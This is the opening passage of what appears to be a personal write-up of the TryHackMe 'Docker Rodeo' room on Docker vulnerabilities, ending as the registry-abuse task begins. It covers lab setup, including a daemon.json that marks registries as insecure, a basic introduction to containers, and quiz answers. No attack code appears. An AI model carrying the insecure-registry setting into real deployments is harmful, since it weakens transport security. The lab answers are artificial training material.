class="menu__link" tabindex="0" href="/writeups/Tryhackme/Linux Local Enumeration/">Linux: Local Enumeration</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/">Linux PrivEsc</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Looking Glass/">Looking Glass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Madness/">Madness</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Magician/">Magician</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Metaspliot/Metasploit/">Metaspliot</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mindgames/">Mindgames</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Misguided Ghosts/Misguided Ghost/">Misguided Ghosts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mnemonic/">Mnemonic</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Motunui/">Motunui</a><button aria-label="Toggle the collapsible sidebar category &#x27;Motunui&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mr Robot CTF/">Mr Robot CTF</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Musical Stego/ Musical Stego/">Musical Stego</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/NIS - Linux Part I/">NIS - Linux Part I</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nax/">Nax</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/NerdHerd/NerdHeard/">NerdHerd</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nessus/">Nessus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Network Services/">Network Services</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Networking/">Networking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ninja Skills/">Ninja Skills</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nmap/">Nmap</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP Top 10/">OWASP Top 10</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP ZAP/">Introduction to OWASP ZAP</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OhSINT/">OhSINT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/One Piece/">One Piece</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Overpass/">Overpass</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Overpass 2 - Hacked/Overpass 2/">Overpass 2 - Hacked</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/PS Empire/">PS Empire</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Peak Hill/">Peak Hill</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Persistence/">Persistence</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Pickle Rick/">Pickle Rick</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Post-Exploitation Basics/Post Exploitation Basics/">Post-Exploitation Basics</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Poster/">Poster</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Printer Hacking 101/">Printer Hacking 101</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Psycho Break/Pyscho Break/">Psycho Break</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Python Playground/">Python Playground</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra/">Ra</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra 2/">Ra 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Racetrack Bank/">Racetrack Bank</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Recovery/">Recovery</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Relevant/Relevent/">Relevant</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Res/">Res</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Retro/">Retro</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Revenge/">Revenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reverse Engineering/">Reverse Engineering</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reversing ELF/">Reversing ELF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/RootMe/">RootMe</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/SSRF/">SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Scripting/">Scripting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Set/">Set</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Shodan.io/Shodan/">Shodan.io</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Simple CTF/">Simple CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Skynet/">Skynet</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Smag Grotto/">Smag Grotto</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Source/">Source</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Splunk/">Splunk</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Spring/">Spring</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Starting Out In Cyber Sec/">Starting Out In Cyber Sec</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Startup/">Startup</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Steel Mountain/">Steel Mountain</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/StuxCTF/">StuxCTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sublist3r/">Sublist3r</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Buffer Overflow/">Sudo Buffer Overflow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Security Bypass/">Sudo Security Bypass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Symfonos6/">symfonos6</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tartarus/">Tartarus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tempus Fugit Durius/">Tempus Fugit Durius</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Blob Blog/">The Blob Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/Tryhackme/The Docker Rodeo/">The Docker Rodeo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Impossible Challenge/">The Impossible Challenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Marketplace/">The Marketplace</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Server From Hell/">The Server From Hell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The find command/">The find command</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Thompson/">Thompson</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tmux/">tmux</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tomghost/">tomghost</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tony the Tiger/">Tony the Tiger</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/ToolsRus/">ToolsRus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tor/">Tor</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tutorial/">Tutorial</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Undiscovered/">Undiscovered</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Upload Vulnerabilities/">Upload Vulnerabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WWBuddy/">WWBuddy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Fundamentals/">Web Fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Scanning/">Web Scanning</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WebAppSec 101/">WebAppSec 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wgel CTF/">Wgel CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Willow/">Willow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Windows PrivEsc Arena/">Windows PrivEsc Arena</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wireshark 101/">Wireshark 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wonderland/">Wonderland</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Dog/">Year of the Dog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Fox/">Year of the Fox</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Pig/">Year of the Pig</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Rabbit/">Year of the Rabbit</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Zero Logon/">Zero Logon</a></li></ul></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Tryhackme</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">The Docker Rodeo</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>The Docker Rodeo</h1><p>Learn a wide variety of Docker vulnerabilities in this guided showcase.</p><p><a href="https://tryhackme.com/room/dockerrodeo" target="_blank" rel="noopener noreferrer">The Docker Rodeo</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="-we-will-cover--the-topics">💢 We will cover  the topics<a href="#-we-will-cover--the-topics" class="hash-link" aria-label="Direct link to 💢 We will cover  the topics" title="Direct link to 💢 We will cover  the topics">​</a></h2><ul><li>Docker Escaping</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-1-1-preface-setting-up-docker-for-this-room-deploy-1">Task 1 1. Preface: Setting up Docker for this Room (Deploy #1)<a href="#task-1-1-preface-setting-up-docker-for-this-room-deploy-1" class="hash-link" aria-label="Direct link to Task 1 1. Preface: Setting up Docker for this Room (Deploy #1)" title="Direct link to Task 1 1. Preface: Setting up Docker for this Room (Deploy #1)">​</a></h2><p>The prerequisites for this room are a bit more complicated then most rooms, however, I&#x27;ll detail every step of the way.</p><p><strong>1.1. Getting Setup</strong></p><p>1.1.1. I strongly recommend using the TryHackMe AttackBox for this room for the most reliable experience.
1.1.2. Deploy the Instance attached to this room and wait for the IP address to be displayed.</p><p>Take note of  the IP address for your deployed Instance: MACHINE_IP</p><p><strong>1.2. Add your Instance IP address to /etc/hosts</strong></p><p>Once you have been given your IP address, you will need to create an entry in your /etc/hosts file with both the IP address and docker-rodeo.thm</p><p>1.2.1. <code>sudo nano /etc/hosts</code>
1.2.2. Add the entry so that it looks like the following: <code>MACHINE_IP    docker-rodeo.thm</code>
1.2.3. Save and close the file.</p><p><strong>1.3. Tell Docker to Trust your Instance</strong></p><p>1.3.1. You will need to either create or enter the following into /etc/docker/daemon.json:</p><div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token property">&quot;insecure-registries&quot;</span><span class="token plain"> </span><span class="token operator">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;docker-rodeo.thm:5000&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;docker-rodeo.thm:7000&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/t1/dockerdaemon.png" class="img_ev3q"></p><p>1.3.2. Save and close the file.</p><p><strong>1.4. Restart Docker</strong></p><p>1.4.1. For the changes to apply, you will need to stop then start (not just restart) the Docker service:</p><p>1.4.1. <code>sudo systemctl stop docker</code>
1.4.2. Wait for approximately 30 seconds
1.4.3. <code>sudo systemctl start docker</code></p><p>You are now ready to progress with the room.</p><p>Let&#x27;s go</p><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-2-2-introduction-to-docker">Task 2 2. Introduction to Docker<a href="#task-2-2-introduction-to-docker" class="hash-link" aria-label="Direct link to Task 2 2. Introduction to Docker" title="Direct link to Task 2 2. Introduction to Docker">​</a></h2><p><strong>2.1. What is Docker?</strong></p><p>Starting in 2013, Docker was introduced to solve the costly and time-consuming process of application development and service delivery. Docker employs what is currently a &quot;hot potato&quot; topic for developers: containerization, this technology separates applications into their own containers, where they share the resources of, but interact with the operating system independently of each other.</p><p><strong>Docker:</strong></p><ul><li>Is extremely portable, if a computer can run Docker, it can run a Docker container. This means that developers only have to write the application once for multiple devices - a very big headache solved!</li><li>Has a considerably less resource usage per-container then Virtual Machines (VMs) I.e. RAM and CPU (we&#x27;ll come onto this later)</li><li>Allows you to set up a complex environment in a few simple steps through Dockerfiles (again, we&#x27;ll come onto this later)</li><li>Is most importantly, very lucrative to a pentester as containerization has been so widely adopted in information technology today.</li></ul><p><strong>2.2. What are Docker &quot;containers&quot; &amp; why are they used?</strong></p><p>As we previously mentioned, containers share computing resources but remain isolated enough to not conflict with one another via the Docker engine. These containers don&#x27;t run a fully-fledged operating system, unlike a VM. Let&#x27;s look at the diagram below for a better picture:</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/t2/docker%20containers2.png" class="img_ev3q"></p><p>We can see three containers running their own applications with no virtualisation. The three applications are isolated from one another, but use the main operating system&#x27;s resources. Whereas, in comparison to running these applications in virtual machines:</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/t2/vm-layers3.png" class="img_ev3q"></p><p>The &quot;Guest Operating System&quot; is where the resources are used up. For example,  a recommended minimum install size of Ubuntu is 20gb, if you were to run this for three applications, you&#x27;d require 60GB of storage. Whereas, a Ubuntu Docker image has the base size of around 180MB~. Containers can share base images too! Extremely space-efficient.</p><p><strong>2.3. What are Docker Images?</strong></p><p>Explaining the details of how docker containers are made aren&#x27;t a requirement of this room. We do, however, need to understand some basic principles for later tasks. Docker containers are created from Docker images; consider these images as instruction manuals telling you how to assemble a piece of furniture.</p><p>These files contain commands such as <code>RUN</code> and <code>COPY</code> that will be executed by the container. <code>RUN</code> commands will execute system commands such as <code>apt-get</code> or <code>ls /home/</code></p><p>Does Docker run on a Hypervisor? (Yay/Nay)</p><p><code>Nay</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-3-3-vulnerability-1-abusing-a-docker-registry">Task 3 3. Vulnerability #1: Abusing a Docker Registry<a href="#task-3-3-vulnerability-1-abusing-a-docker-registry" class="hash-link" aria-label="Direct link to Task 3 3. Vulnerability #1: Abusing a Docker Registry" title="Direct link to Task 3 3. Vulnerability #1: Abusing a Docker Registry">​</a></h2><p>This task is a divider, please proceed onto the next task.</p><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-4-31-what-is-a-docker-registry">Task 4 3.1. What is a Docker Registry?<a href="#task-4-31-what-is-a-docker-registry" class="hash-link" aria-label="Direct link to Task 4 3.1. What is a Docker Registry?" title="Direct link to Task 4 3.1. What is a Docker Registry?">​</a></h2><p>Before we being exploiting a Docker Registry, we need to first understand not only how we interact with them, but as to why they are so lucrative for us pentesters.</p><p>If you&#x27;re familiar with <a href="https://git-scm.com/" target="_blank" rel="noopener noreferrer">Git</a> and services such as <a href="https://github.com/" target="_blank" rel="noopener noreferrer">GitHub</a> and <a href="https://about.gitlab.com/" target="_blank" rel="noopener noreferrer">Gitlab</a>, this&#x27;ll be a breeze. However, let&#x27;s explain a bit further to ensure we&#x27;re all on the same page.</p><p>Docker Registries, at their fundamental, are used to store and provide published Docker images for use. Using repositories, creators of Docker images can switch between multiple versions of their applications and share them with other people with ease.</p><p>Public registries such as DockerHub exist, however, many organisations using Docker will host their own &quot;private&quot; registry.</p><p>Take for example the <a href="https://hub.docker.com/repository/docker/rustscan/rustscan" target="_blank" rel="noopener noreferrer">RustScan DockerHub registry</a>. The developers have created a &quot;tag&quot; for every version of RustScan. As this is public, anyone can switch between the version of RustScan that they want to use with ease by downloading the image for the tag they want to use.</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/t3/rustscan.png" class="img_ev3q"></p><p><a href="https://hub.docker.com/r/rustscan/rustscan" target="_blank" rel="noopener noreferrer">RustScan&#x27;s DockerHub Repository</a></p><p>I could simply do <code>docker pull rustscan/rustscan:1.8.0</code> to use version 1.8.0 of RustScan, or I could use 